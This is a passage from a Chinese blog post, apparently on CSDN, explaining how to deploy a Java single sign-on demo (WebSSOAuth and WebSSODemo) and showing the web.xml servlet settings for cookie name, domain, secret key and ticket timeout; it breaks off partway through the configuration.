<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
</p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>项目部署</strong></p>&#13;
<p style="margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; color:rgb(85,85,85); font-family:'microsoft yahei'; font-size:15px; line-height:35px">&#13;
<strong>       </strong>项目中包含的是两个Eclipse Project，导入到Eclipse/MyEclipse后，可能需要设置下JavaEE类库。WebSSOAuth为认证系统，WebSSODemo为应用系统，如果映射的域名和我设置的一样，不需要设置，直接部署即可。如果不一样，需要修改下两个项目的web.xml文件。关键配置信息如下：<br />&#13;
       WebSSOAuth/WEB-INF/web.xml：</p>&#13;
<div class="dp-highlighter bg_html" style="font-family:Consolas,'Courier New',Courier,mono,serif; width:938.516px; overflow:hidden; padding-top:1px; border-color:rgb(204,204,204); color:rgb(85,85,85); line-height:35px; margin:18px 0px!important; background-color:rgb(231,229,220)">&#13;
<div class="bar" style="padding-left:45px">&#13;
<div class="tools" style="padding:3px 8px 10px 10px; font-size:9px; line-height:normal; font-family:Verdana,Geneva,Arial,Helvetica,sans-serif; color:silver; border-left-width:3px; border-left-style:solid; border-left-color:rgb(153,153,153); background-color:rgb(248,248,248)">&#13;
<strong>[html]</strong> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="ViewSource" title="view plain" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">view&#13;
 plain</a><span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="CopyToClipboard" title="copy" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">copy</a></span>&#13;
<div style="position:absolute; left:476px; top:1922px; width:27px; height:15px; z-index:99">&#13;
</div>&#13;
<span> <a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="PrintSource" title="print" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">print</a></span><a target="_blank" href="http://blog.csdn.net/ghsau/article/details/20466351" class="About" title="?" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit">?</a><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/217752" title="在CODE上查看代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/CODE_ico.png" width="12" height="12" alt="在CODE上查看代码片" style="border:none; position:relative; top:1px; left:2px" /></a></span><span class="tracking-ad"><a target="_blank" href="https://code.csdn.net/snippets/217752/fork" title="派生到我的代码片" style="text-decoration:none; border:none; padding:0px; margin:0px 10px 0px 0px; font-size:9px; color:rgb(12,137,207); background-color:inherit"><img src="https://code.csdn.net/assets/ico_fork.svg" width="12" height="12" alt="派生到我的代码片" style="border:none; position:relative; top:2px; left:2px" /></a></span></div>&#13;
</div>&#13;
<ol start="1" class="dp-xml" style="padding:0px; border:none; color:rgb(92,92,92); margin:0px 0px 1px 45px!important; background-color:rgb(255,255,255)">&#13;
<li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit"><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet-class</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">com.ghsau.servlet.SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet-class</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="comments" style="margin:0px; padding:0px; border:none; color:rgb(0,130,0); background-color:inherit">&lt;!-- ticket名称 --&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">cookieName</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOID</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="comments" style="margin:0px; padding:0px; border:none; color:rgb(0,130,0); background-color:inherit">&lt;!-- ticket作用域 --&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">domainName</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">.ghsau.com</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">secure</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">false</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="comments" style="margin:0px; padding:0px; border:none; color:rgb(0,130,0); background-color:inherit">&lt;!-- ticket内容加密密钥，必须为24个字符，中文算2个字符 --&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">secretKey</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">111111112222222233333333</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="comments" style="margin:0px; padding:0px; border:none; color:rgb(0,130,0); background-color:inherit">&lt;!-- 服务器中ticket的有效期，单位分钟 --&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">ticketTimeout</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">      <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">10080</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">param-value</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">init-param</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">  <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">  <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet-mapping</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">servlet-name</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li class="alt" style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:inherit; line-height:18px; background-color:rgb(245,250,226)">&#13;
<span style="margin:0px; padding:0px; border:none; color:black; background-color:inherit">    <span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">/SSOAuth</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&lt;/</span><span class="tag-name" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">url-pattern</span><span class="tag" style="margin:0px; padding:0px; border:none; color:blue; font-weight:bold; background-color:inherit">&gt;</span><span style="margin:0px; padding:0px; border:none; background-color:inherit">  </span></span></li><li style="margin:0px!important; padding:0px 3px 0px 10px!important; border-style:none none none solid; border-left-width:3px; border-left-color:rgb(153,153,153); list-style:decimal-leading-zero outside; color:rgb(85,85,85); line-height:18px; background-color:rgb(245,250,226)">&#13;
